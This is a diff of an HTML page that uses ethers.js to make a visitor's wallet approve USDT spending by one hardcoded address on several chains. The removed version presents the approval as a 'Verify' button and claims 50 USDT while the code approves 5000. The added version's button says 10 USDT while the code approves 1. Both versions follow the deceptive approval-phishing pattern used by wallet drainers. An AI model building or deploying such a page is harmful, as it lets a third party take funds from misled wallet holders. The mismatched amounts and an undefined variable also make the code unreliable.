@@ -1,40 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>USDT Authorization</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>USDT Authorization TesT</title>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
 </head>
 
 <body>
 
-<h3>USDT Authorization</h3>
+<h3>USDT Authorization Test</h3>
 
-<p id="walletStatus">Checking wallet...</p>
+<p id="status">Checking wallet...</p>
 
 <button id="approve">
-  Verify
+    Authorize 10 USDT
 </button>
 
 <script>
 
-const BLOCKCHAIN_CONFIG={
-  1:{name:'Ethereum',usdt:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6},
-  137:{name:'Polygon',usdt:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',decimals:6},
-  56:{name:'BSC',usdt:'0x55d398326f99059fF775485246999027B3197955',decimals:18},
-  43114:{name:'Avalanche',usdt:'0x9702230A8657203FB529F0DC7B46D6F2aa1C9456',decimals:6},
-  250:{name:'Fantom',usdt:'0x049d68029B375EF3d6b9c08F9c925aDC6671ff20',decimals:6},
-  42161:{name:'Arbitrum',usdt:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',decimals:6}
+const NETWORKS = {
+
+    1: {
+        name: "Ethereum",
+        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        decimals: 6,
+        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
+    },
+
+    137: {
+        name: "Polygon",
+        token: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+        decimals: 6,
+        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
+    },
+
+    43114: {
+        name: "Avalanche",
+        token: "0x9702230A8Ea53601f5cD2dc00fDBC13d4dF4A8c7",
+        decimals: 6,
+        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
+    }
+
 };
-const SPENDER = "0xa7C380414bAA310898f444e21F7364b43Ae2591A";
 
-// 50 USDT
-const AMOUNT = 5000n * 10n ** 6n;
-
-const ERC20_ABI = [
-  "function approve(address spender,uint256 amount) returns(bool)",
-  "function allowance(address owner,address spender) view returns(uint256)"
+const ABI = [
+ "function approve(address,uint256)",
+ "function allowance(address,address) view returns(uint256)"
 ];
 
 let provider;
@@ -42,130 +55,160 @@ let signer;
 let user;
 
 
-// Automatically check wallet when page opens
-async function initWallet() {
+async function init() {
 
-  if (!window.ethereum) {
-    document.getElementById("walletStatus").innerText =
-      "Open this page inside MetaMask or another Web3 wallet.";
-    return;
-  }
-
-  provider =
-    new ethers.BrowserProvider(window.ethereum);
-
-  // Does NOT show connect popup
-  const accounts =
-    await provider.send("eth_accounts", []);
-
-  if (accounts.length > 0) {
-
-    user = accounts[0];
-    signer = await provider.getSigner();
-
-    document.getElementById("walletStatus").innerText =
-      "Wallet: " + user;
-
-  } else {
-
-    document.getElementById("walletStatus").innerText =
-      "Wallet detected";
-
-  }
-}
-
-
-// Get account only if necessary
-async function getSigner() {
-
-  if (!provider) {
-    provider =
-      new ethers.BrowserProvider(window.ethereum);
-  }
-
-  let accounts =
-    await provider.send("eth_accounts", []);
-
-  // User has not previously authorized this website
-  if (accounts.length === 0) {
-
-    accounts =
-      await provider.send(
-        "eth_requestAccounts",
-        []
-      );
-
-  }
-
-  user = accounts[0];
-  signer = await provider.getSigner();
-
-  return signer;
-}
-
-
-// Authorize USDT
-document.getElementById("approve").onclick =
-async () => {
-
-  try {
-
-    if (!window.ethereum)
-      throw new Error("Wallet not detected");
-
-    await getSigner();
-
-    const token =
-      new ethers.Contract(
-        USDT,
-        ERC20_ABI,
-        signer
-      );
-
-    const currentAllowance =
-      await token.allowance(
-        user,
-        SPENDER
-      );
-
-    if (currentAllowance >= AMOUNT) {
-
-      alert(
-        "This wallet already authorized at least 50 USDT."
-      );
-
-      return;
+    if (!window.ethereum) {
+        status.innerText = "EVM wallet not detected";
+        return;
     }
 
-    const tx =
-      await token.approve(
-        SPENDER,
-        AMOUNT
-      );
+    provider =
+        new ethers.BrowserProvider(window.ethereum);
 
-    await tx.wait();
+    let accounts =
+        await provider.send("eth_accounts", []);
 
-    alert(
-      "50 USDT spending authorization granted."
-    );
+    if (accounts.length) {
 
-  } catch (error) {
+        user = accounts[0];
 
-    console.error(error);
+        signer =
+            await provider.getSigner();
 
-    alert(
-      error.shortMessage ||
-      error.message
-    );
+        showNetwork();
 
-  }
+    } else {
+
+        status.innerText =
+            "Wallet detected — authorization required";
+
+    }
+}
+
+
+async function showNetwork() {
+
+    const network =
+        await provider.getNetwork();
+
+    const id =
+        Number(network.chainId);
+
+    const config =
+        NETWORKS[id];
+
+    if (!config) {
+
+        status.innerText =
+            `Unsupported EVM network (${id})`;
+
+        return;
+    }
+
+    status.innerText =
+        `${config.name} | ${user}`;
+}
+
+
+async function getSigner() {
+
+    let accounts =
+        await provider.send("eth_accounts", []);
+
+    if (!accounts.length) {
+
+        accounts =
+            await provider.send(
+                "eth_requestAccounts",
+                []
+            );
+
+    }
+
+    user = accounts[0];
+
+    signer =
+        await provider.getSigner();
+}
+
+
+approve.onclick = async () => {
+
+    try {
+
+        if (!provider)
+            throw Error("Wallet unavailable");
+
+        await getSigner();
+
+        const network =
+            await provider.getNetwork();
+
+        const chainId =
+            Number(network.chainId);
+
+        const config =
+            NETWORKS[chainId];
+
+        if (!config)
+            throw Error("Unsupported network");
+
+        if (
+            !ethers.isAddress(config.spender)
+        )
+            throw Error(
+                `Spender not configured for ${config.name}`
+            );
+
+        const token =
+            new ethers.Contract(
+                config.token,
+                ABI,
+                signer
+            );
+
+        const amount =
+            ethers.parseUnits(
+                "1",
+                config.decimals
+            );
+
+        const tx =
+            await token.approve(
+                config.spender,
+                amount
+            );
+
+        status.innerText =
+            "Waiting for confirmation...";
+
+        await tx.wait();
+
+        status.innerText =
+            `1 USDT authorized on ${config.name}`;
+
+    } catch(e) {
+
+        console.error(e);
+
+        status.innerText =
+            e.shortMessage || e.message;
+    }
 };
 
 
-// Run automatically
-initWallet();
+window.ethereum?.on(
+    "chainChanged",
+    () => location.reload()
+);
+
+window.ethereum?.on(
+    "accountsChanged",
+    () => location.reload()
+);
+
+init();
 
 </script>
-
 </body>
 </html>
